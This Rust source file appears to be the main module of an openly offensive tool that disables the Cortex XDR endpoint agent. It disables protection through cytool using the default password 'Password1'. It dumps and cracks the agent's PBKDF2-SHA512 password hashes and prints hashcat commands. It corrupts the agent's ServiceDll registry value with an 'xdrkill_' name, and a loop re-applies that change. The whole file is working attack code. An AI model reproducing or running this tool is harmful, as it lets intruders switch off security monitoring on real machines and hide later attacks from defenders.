mod agent;
mod cli;
mod crack;
mod hashdump;
mod reg;
mod sys;
mod ui;

use std::path::PathBuf;
use std::process::ExitCode;

fn main() -> ExitCode {
    let argv: Vec<String> = std::env::args().skip(1).collect();

    if argv.iter().any(|a| a == "--help" || a == "-h") {
        println!("{}", cli::USAGE);
        return ExitCode::from(0);
    }

    if argv.iter().any(|a| a == "--version" || a == "-V") {
        println!("{} {}", env!("CARGO_PKG_NAME"), env!("CARGO_PKG_VERSION"));
        return ExitCode::from(0);
    }

    // Pre-parseo de flags globales antes del parseo genérico (cli.rs sólo ve
    // el subcomando y sus propias banderas como --persist).
    let mut restore_flag = false;
    let mut dll_opt: Option<String> = None;
    let mut enable_flag = false;
    let mut password_opt: Option<String> = None;
    let mut out_opt: Option<PathBuf> = None;
    let mut hash_opt: Option<String> = None;
    let mut salt_opt: Option<String> = None;
    let mut iterations_opt: Option<u32> = None;
    let mut wordlist_opt: Option<PathBuf> = None;
    let mut dry_flag = false;
    let mut filtered: Vec<String> = Vec::with_capacity(argv.len());
    let mut i = 0usize;
    let mut pre_err: Option<String> = None;
    while i < argv.len() {
        match argv[i].as_str() {
            "--restore" => {
                restore_flag = true;
                i += 1;
            }
            "--dll" => {
                i += 1;
                if i < argv.len() {
                    dll_opt = Some(argv[i].clone());
                    i += 1;
                } else {
                    pre_err = Some("--dll requiere un argumento".to_string());
                    break;
                }
            }
            "--enable" => {
                enable_flag = true;
                i += 1;
            }
            "-p" | "--password" => {
                i += 1;
                if i < argv.len() {
                    password_opt = Some(argv[i].clone());
                    i += 1;
                } else {
                    pre_err = Some("--password requiere un argumento".to_string());
                    break;
                }
            }
            "--out" => {
                i += 1;
                if i < argv.len() {
                    out_opt = Some(PathBuf::from(&argv[i]));
                    i += 1;
                } else {
                    pre_err = Some("--out requiere un argumento".to_string());
                    break;
                }
            }
            "--hash" => {
                i += 1;
                if i < argv.len() {
                    hash_opt = Some(argv[i].clone());
                    i += 1;
                } else {
                    pre_err = Some("--hash requiere un argumento".to_string());
                    break;
                }
            }
            "--salt" => {
                i += 1;
                if i < argv.len() {
                    salt_opt = Some(argv[i].clone());
                    i += 1;
                } else {
                    pre_err = Some("--salt requiere un argumento".to_string());
                    break;
                }
            }
            "--iterations" => {
                i += 1;
                if i < argv.len() {
                    match argv[i].parse::<u32>() {
                        Ok(v) => iterations_opt = Some(v),
                        Err(_) => {
                            pre_err = Some(format!("--iterations inválido: {}", argv[i]));
                            break;
                        }
                    }
                    i += 1;
                } else {
                    pre_err = Some("--iterations requiere un argumento".to_string());
                    break;
                }
            }
            "--wordlist" => {
                i += 1;
                if i < argv.len() {
                    wordlist_opt = Some(PathBuf::from(&argv[i]));
                    i += 1;
                } else {
                    pre_err = Some("--wordlist requiere un argumento".to_string());
                    break;
                }
            }
            "--dry-run" => {
                dry_flag = true;
                i += 1;
            }
            _ => {
                filtered.push(argv[i].clone());
                i += 1;
            }
        }
    }

    if let Some(e) = pre_err {
        ui::err(&e);
        eprintln!("{}", cli::USAGE);
        return ExitCode::from(1);
    }

    let args = match cli::parse(&filtered) {
        Ok(a) => a,
        Err(e) => {
            ui::err(&e);
            eprintln!("{}", cli::USAGE);
            return ExitCode::from(1);
        }
    };

    ui::set_json(args.json);

    // Contraseña por defecto de fábrica de cytool; solo se aplica cuando el
    // subcomando es cytool (el resto la ignora).
    let password = password_opt.unwrap_or_else(|| "Password1".to_string());

    let code: u8 = match args.cmd {
        cli::Cmd::Recon => recon(),
        cli::Cmd::Sabotage { persist } => {
            let c = sabotage(dll_opt.as_deref(), restore_flag);
            if c == 0 && !restore_flag {
                if let Some(secs) = persist {
                    persist_loop(secs);
                }
            }
            c
        }
        cli::Cmd::Cytool(action) => cytool(action, enable_flag, &password, false),
        cli::Cmd::DumpHash => dump_hash(out_opt),
        cli::Cmd::Crack => {
            let h = hash_opt.as_deref().unwrap_or("");
            let s = salt_opt.as_deref().unwrap_or("");
            let it = iterations_opt.unwrap_or(crack::DEFAULT_ITERATIONS);
            crack_cmd(h, s, it, wordlist_opt)
        }
        cli::Cmd::Auto { persist } => {
            let c = auto(&password, dll_opt.as_deref(), wordlist_opt, dry_flag);
            if c == 0 && !dry_flag {
                if let Some(secs) = persist {
                    persist_loop(secs);
                }
            }
            c
        }
    };

    ExitCode::from(code)
}

fn json_opt(v: Option<String>) -> String {
    match v {
        Some(s) => format!("\"{}\"", ui::esc(&s)),
        None => "null".to_string(),
    }
}

fn recon() -> u8 {
    let admin = sys::is_admin();
    if !admin {
        ui::warn("sin privilegios de administrador; información parcial");
    }

    let traps = agent::traps_dir();
    let services = agent::services_present();
    let installed = traps.is_some() || !services.is_empty();
    let cytool_bin = agent::cytool();
    let service_dll = match reg::read() {
        Ok(Some((_ty, data))) => Some(sys::from_wide(&data)),
        Ok(None) => None,
        Err(e) => {
            ui::warn(&format!("no se pudo leer ServiceDll (código {e})"));
            None
        }
    };
    let db_count = agent::persistence_dbs().len();

    if ui::json() {
        let svcs: Vec<String> = services
            .iter()
            .map(|s| format!("\"{}\"", ui::esc(s)))
            .collect();
        let svcs_joined = svcs.join(",");
        println!(
            "{{\"ok\":{ok},\"admin\":{admin},\"installed\":{installed},\"services\":[{svcs}],\"traps_dir\":{traps},\"cytool\":{cytool},\"service_dll\":{dll},\"db_count\":{db_count}}}",
            ok = installed,
            svcs = svcs_joined,
            traps = json_opt(traps.as_ref().map(|p| p.display().to_string())),
            cytool = json_opt(cytool_bin.as_ref().map(|p| p.display().to_string())),
            dll = json_opt(service_dll),
        );
    } else {
        ui::info(&format!("admin: {admin}"));
        ui::info(&format!("instalado: {installed}"));
        let svc_str = if services.is_empty() {
            "(ninguno)".to_string()
        } else {
            services.join(", ")
        };
        ui::info(&format!("servicios presentes: {svc_str}"));
        let traps_str = traps
            .as_ref()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| "(no encontrado)".to_string());
        ui::info(&format!("traps dir: {traps_str}"));
        let cytool_str = cytool_bin
            .as_ref()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| "(no encontrado)".to_string());
        ui::info(&format!("cytool: {cytool_str}"));
        let dll_str = service_dll.unwrap_or_else(|| "(no existe)".to_string());
        ui::info(&format!("ServiceDll: {dll_str}"));
        ui::info(&format!("bases de datos candidatas: {db_count}"));
    }

    if !installed {
        if !ui::json() {
            ui::warn("agente Cortex XDR no detectado");
        }
        return 3;
    }
    0
}

fn sabotage(dll: Option<&str>, restore: bool) -> u8 {
    if !sys::is_admin() {
        ui::err("se requieren privilegios de administrador");
        return 2;
    }

    if restore {
        return match reg::restore() {
            Ok(Some(v)) => {
                if ui::json() {
                    println!("{{\"ok\":true,\"service_dll\":\"{}\"}}", ui::esc(&v));
                } else {
                    ui::ok(&format!("ServiceDll restaurado: {v}"));
                }
                0
            }
            Ok(None) => {
                if ui::json() {
                    println!("{{\"ok\":true,\"service_dll\":null}}");
                } else {
                    ui::ok("nada que restaurar");
                }
                0
            }
            Err(e) => {
                ui::err(&e);
                4
            }
        };
    }

    match reg::sabotage(dll) {
        Ok(name) => {
            if ui::json() {
                println!("{{\"ok\":true,\"service_dll\":\"{}\"}}", ui::esc(&name));
            } else {
                ui::ok(&format!("ServiceDll = {name}"));
                ui::warn("se requiere reinicio para aplicar los cambios");
            }
            0
        }
        Err(e) => {
            ui::err(&e);
            4
        }
    }
}

fn cytool(action: cli::Action, enable: bool, password: &str, quiet: bool) -> u8 {
    use std::io::Read;
    use std::process::{Command, Stdio};
    use std::time::{Duration, Instant};

    const TIMEOUT: Duration = Duration::from_secs(60);
    const POLL: Duration = Duration::from_millis(100);

    if !sys::is_admin() {
        ui::err("se requieren privilegios de administrador");
        return 2;
    }

    let exe = match agent::cytool() {
        Some(p) => p,
        None => {
            ui::err("cytool.exe no encontrado");
            return 3;
        }
    };

    let verb: &str = match action {
        cli::Action::Startup => "startup",
        cli::Action::Protect => "protect",
        cli::Action::Runtime => "runtime",
        cli::Action::EventCollection => "eventcollection",
        cli::Action::Uninstall => "uninstall",
    };
    let mode: &str = if enable { "enable" } else { "disable" };

    let mut args: Vec<&str> = vec![verb];
    if !matches!(action, cli::Action::Uninstall) {
        args.push(mode);
    }
    args.push("-p");
    args.push(password);

    if !quiet {
        ui::info(&format!("comando: {} {}", exe.display(), args.join(" ")));
    }

    let mut cmd = Command::new(&exe);
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    for a in &args {
        cmd.arg(a);
    }

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            if !quiet {
                ui::err(&format!("no se pudo lanzar cytool: {e}"));
            }
            return 4;
        }
    };

    let stdout_pipe = match child.stdout.take() {
        Some(s) => s,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            if !quiet {
                ui::err("cytool: stdout no disponible");
            }
            return 4;
        }
    };
    let stderr_pipe = match child.stderr.take() {
        Some(s) => s,
        None => {
            let _ = child.kill();
            let _ = child.wait();
            if !quiet {
                ui::err("cytool: stderr no disponible");
            }
            return 4;
        }
    };

    let out_thread = std::thread::spawn(move || {
        let mut s = String::new();
        let mut r = stdout_pipe;
        let _ = r.read_to_string(&mut s);
        s
    });
    let err_thread = std::thread::spawn(move || {
        let mut s = String::new();
        let mut r = stderr_pipe;
        let _ = r.read_to_string(&mut s);
        s
    });

    let start = Instant::now();
    let mut timed_out = false;
    let mut status_opt: Option<std::process::ExitStatus> = None;
    loop {
        match child.try_wait() {
            Ok(Some(s)) => {
                status_opt = Some(s);
                break;
            }
            Ok(None) => {
                if start.elapsed() >= TIMEOUT {
                    let _ = child.kill();
                    timed_out = true;
                    if let Ok(s) = child.wait() {
                        status_opt = Some(s);
                    }
                    break;
                }
                std::thread::sleep(POLL);
            }
            Err(_) => {
                let _ = child.kill();
                let _ = child.wait();
                break;
            }
        }
    }

    let out_text: String = out_thread.join().unwrap_or_default();
    let err_text: String = err_thread.join().unwrap_or_default();

    let code_i32: i32 = status_opt.as_ref().and_then(|s| s.code()).unwrap_or(-1);
    let success = !timed_out
        && status_opt
            .as_ref()
            .map(|s| s.success())
            .unwrap_or(false);

    if !quiet {
        if ui::json() {
            println!(
                "{{\"ok\":{},\"code\":{},\"timed_out\":{},\"stdout\":\"{}\",\"stderr\":\"{}\"}}",
                success,
                code_i32,
                timed_out,
                ui::esc(&out_text),
                ui::esc(&err_text)
            );
        } else {
            for line in out_text.lines().filter(|l| !l.trim().is_empty()) {
                println!("    {line}");
            }
            for line in err_text.lines().filter(|l| !l.trim().is_empty()) {
                eprintln!("    {line}");
            }
            if timed_out {
                ui::err("cytool: tiempo de espera agotado (60 s)");
            }
            if success {
                ui::ok("cytool completado");
            } else {
                ui::err(&format!("cytool falló (código {code_i32})"));
            }
        }
    }

    if success {
        0
    } else {
        4
    }
}

fn dump_hash(out: Option<PathBuf>) -> u8 {
    let dbs = agent::persistence_dbs();
    if dbs.is_empty() {
        ui::err("no se encontraron bases de datos de persistencia");
        return 3;
    }

    let mut pairs_per_file: Vec<(PathBuf, Vec<hashdump::Pair>)> = Vec::new();
    for db in &dbs {
        let pairs = hashdump::extract(db);
        ui::info(&format!("{}: {} pares", db.display(), pairs.len()));
        pairs_per_file.push((db.clone(), pairs));
    }

    let (source, pair) = match pairs_per_file
        .into_iter()
        .find_map(|(s, p)| p.into_iter().next().map(|pair| (s, pair)))
    {
        Some(x) => x,
        None => {
            ui::err("no se extrajo ningún par hash/salt");
            return 4;
        }
    };

    let iter = crack::DEFAULT_ITERATIONS;
    let hc = hashdump::hashcat_line(iter, &pair.salt_b64, &pair.hash_b64);
    let hex = hashdump::debug_hex(&pair);
    let source_s = source.display().to_string();

    let json_str = format!(
        "{{\"source\":\"{}\",\"hash_b64\":\"{}\",\"salt_b64\":\"{}\",\"iterations\":{},\"hashcat\":\"{}\"}}",
        ui::esc(&source_s),
        ui::esc(&pair.hash_b64),
        ui::esc(&pair.salt_b64),
        iter,
        ui::esc(&hc),
    );

    if ui::json() {
        println!("{json_str}");
    } else {
        ui::ok(&format!("origen: {source_s}"));
        ui::info(&format!("hash (b64): {}", pair.hash_b64));
        ui::info(&format!("salt (b64): {}", pair.salt_b64));
        ui::info(&format!("hex: {hex}"));
        println!("hashcat -m 12100 '{hc}' wordlist.txt");
    }

    if let Some(path) = out {
        if let Err(e) = std::fs::write(&path, json_str.as_bytes()) {
            ui::err(&format!("no se pudo escribir {}: {e}", path.display()));
            return 4;
        }
        if !ui::json() {
            ui::ok(&format!("escrito {}", path.display()));
        }
    }

    0
}

fn crack_cmd(
    hash_b64: &str,
    salt_b64: &str,
    iterations: u32,
    wordlist: Option<PathBuf>,
) -> u8 {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    if hash_b64.is_empty() || salt_b64.is_empty() {
        ui::err("faltan --hash y/o --salt");
        return 1;
    }

    let expected = match STANDARD.decode(hash_b64) {
        Ok(v) if !v.is_empty() => v,
        _ => {
            ui::err("hash base64 inválido o vacío");
            return 1;
        }
    };
    let salt = match STANDARD.decode(salt_b64) {
        Ok(v) if !v.is_empty() => v,
        _ => {
            ui::err("salt base64 inválido o vacío");
            return 1;
        }
    };

    let iter = if iterations == 0 {
        crack::DEFAULT_ITERATIONS
    } else {
        iterations
    };

    ui::info("algoritmo: pbkdf2-hmac-sha512");
    ui::info(&format!("iteraciones: {iter}"));
    ui::info(&format!("dklen: {}", expected.len()));

    let wl = wordlist.as_deref();
    match crack::crack(&expected, &salt, iter, wl) {
        Some((pw, tried)) => {
            if ui::json() {
                println!(
                    "{{\"ok\":true,\"found\":\"{}\",\"tried\":{}}}",
                    ui::esc(&pw),
                    tried
                );
            } else {
                ui::ok(&format!("contraseña encontrada: {pw}"));
                ui::info(&format!("intentos: {tried}"));
            }
            0
        }
        None => {
            if ui::json() {
                println!("{{\"ok\":false,\"tried\":0}}");
            } else {
                ui::err("contraseña no encontrada");
                ui::info(
                    "sugerencia: usa una wordlist mayor (--wordlist) o `hashcat -m 12100 <línea> wordlist.txt`",
                );
            }
            4
        }
    }
}

// Intenta extraer y crackear la primera contraseña encontrada en las bases
// de persistencia. Devuelve la contraseña y el origen, o el código de fallo.
fn crack_from_dump(wordlist: Option<&std::path::Path>) -> Result<Option<(String, String)>, u8> {
    use base64::{engine::general_purpose::STANDARD, Engine as _};

    let dbs = agent::persistence_dbs();
    if dbs.is_empty() {
        return Err(3);
    }
    for db in &dbs {
        let pairs = hashdump::extract(db);
        for p in pairs {
            let expected = match STANDARD.decode(&p.hash_b64) {
                Ok(v) if !v.is_empty() => v,
                _ => continue,
            };
            let salt = match STANDARD.decode(&p.salt_b64) {
                Ok(v) if !v.is_empty() => v,
                _ => continue,
            };
            if let Some((pw, _tried)) =
                crack::crack(&expected, &salt, crack::DEFAULT_ITERATIONS, wordlist)
            {
                return Ok(Some((pw, db.display().to_string())));
            }
        }
    }
    Ok(None)
}

fn auto(password: &str, dll: Option<&str>, wordlist: Option<PathBuf>, dry: bool) -> u8 {
    let json_was_on = ui::json();
    ui::set_json(false); // los sub-calls no contaminan stdout en modo --json
    let code = auto_inner(password, dll, wordlist, dry);
    ui::set_json(json_was_on);
    if json_was_on {
        println!("{{\"ok\":{},\"code\":{}}}", code == 0, code);
    }
    code
}

fn auto_inner(password: &str, dll: Option<&str>, wordlist: Option<PathBuf>, dry: bool) -> u8 {
    if !agent::installed() {
        ui::err("agente Cortex XDR no detectado");
        return 3;
    }

    let admin = sys::is_admin();
    if !admin {
        ui::warn("sin privilegios de administrador: se omite cytool y sabotage");
    }

    let mut overall: u8 = 0;
    let bump = |c: u8, o: &mut u8| {
        if *o == 0 && c != 0 {
            *o = c;
        }
    };

    // --- Fase 1: cytool con contraseña por defecto ---
    let acts: [(cli::Action, &str); 3] = [
        (cli::Action::Runtime, "runtime"),
        (cli::Action::Protect, "protect"),
        (cli::Action::EventCollection, "eventcollection"),
    ];
    let mut phase1_ok: bool = true;
    if admin {
        ui::info("--- fase 1: cytool ---");
        if dry {
            for (_a, name) in &acts {
                ui::info(&format!("(dry) cytool {name} disable"));
            }
        } else {
            for (a, name) in acts {
                let c = cytool(a, false, password, true);
                if c != 0 {
                    ui::warn(&format!(
                        "cytool {name} falló (código {c}); la contraseña por defecto no sirve"
                    ));
                    phase1_ok = false;
                    break;
                }
            }
        }
    } else {
        ui::info("(fase 1 omitida: sin admin)");
    }

    // --- Fase 2: dumphash + crack ---
    ui::info("--- fase 2: dump + crack ---");
    let mut found_pw: Option<String> = None;
    match crack_from_dump(wordlist.as_deref()) {
        Ok(Some((pw, src))) => {
            ui::ok(&format!("contraseña recuperada: {pw} (origen: {src})"));
            found_pw = Some(pw);
        }
        Ok(None) => {
            ui::warn("no se pudo crackear la contraseña con los candidatos disponibles");
            bump(4, &mut overall);
        }
        Err(c) => {
            ui::err(&format!("fase 2 falló (código {c})"));
            bump(c, &mut overall);
        }
    }

    // Reintento de cytool con la contraseña recuperada (solo Runtime).
    if !phase1_ok && admin && !dry {
        if let Some(pw) = found_pw.as_deref() {
            if pw != password {
                ui::info("reintentando cytool Runtime disable con la contraseña recuperada...");
                let c = cytool(cli::Action::Runtime, false, pw, true);
                if c == 0 {
                    phase1_ok = true;
                } else {
                    ui::warn(&format!("retry cytool falló (código {c})"));
                }
            }
        }
    }
    if !phase1_ok {
        bump(4, &mut overall);
    }

    // --- Fase 3: sabotage ---
    if admin {
        ui::info("--- fase 3: sabotage ---");
        if dry {
            let name = match dll {
                Some(s) if !s.is_empty() => s.to_string(),
                _ => sys::random_dll_name(),
            };
            ui::info(&format!("(dry) se escribiría ServiceDll = {name}"));
        } else {
            match reg::sabotage(dll) {
                Ok(name) => {
                    ui::ok(&format!("ServiceDll = {name}"));
                    ui::warn("se requiere reinicio para aplicar los cambios");
                }
                Err(e) => {
                    ui::err(&format!("sabotage falló: {e}"));
                    bump(4, &mut overall);
                }
            }
        }
    } else {
        ui::info("(fase 3 omitida: sin admin)");
    }

    if overall == 0 {
        ui::ok("cadena completada");
    } else {
        ui::err(&format!("cadena finalizada con código {overall}"));
    }
    overall
}

fn persist_loop(interval_secs: u32) {
    if !sys::is_admin() {
        ui::err("--persist requiere administrador; bucle omitido");
        return;
    }
    let secs = interval_secs.max(5);
    ui::info(&format!(
        "persistencia activa: comprobando cada {secs}s (Ctrl-C para salir)"
    ));
    loop {
        std::thread::sleep(std::time::Duration::from_secs(secs as u64));
        let current = match reg::read() {
            Ok(Some((_ty, data))) => sys::from_wide(&data),
            _ => String::new(),
        };
        if !current.contains("xdrkill_") {
            match reg::sabotage(None) {
                Ok(name) => ui::ok(&format!("re-aplicado ServiceDll = {name}")),
                Err(e) => ui::err(&format!("re-aplicación fallida: {e}")),
            }
        }
    }
}
